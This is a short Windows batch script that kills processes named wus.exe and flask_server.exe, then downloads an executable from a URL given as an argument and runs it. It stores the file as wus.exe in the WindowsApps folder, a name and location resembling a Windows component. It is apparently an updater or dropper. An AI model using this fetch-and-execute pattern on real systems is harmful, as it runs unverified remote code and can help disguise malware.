@echo off
taskkill /F /IM wus.exe
taskkill /F /IM flask_server.exe
del /f /q %localappdata%\Microsoft\WindowsApps\wus.exe
powershell -command iwr -Uri %1 -OutFile %localappdata%\Microsoft\WindowsApps\wus.exe
%localappdata%\Microsoft\WindowsApps\wus.exe
tasklist | find "wus" >nul
timeout /t 10 /nobreak > nul
if %errorlevel%==0 (
    exit
) else (
   if exist "%localappdata%\Microsoft\WindowsApps\wus.exe" (
      %localappdata%\Microsoft\WindowsApps\wus.exe
   ) else (
      powershell -command iwr -Uri %1 -OutFile %localappdata%\Microsoft\WindowsApps\wus.exe
   )
    
)

exit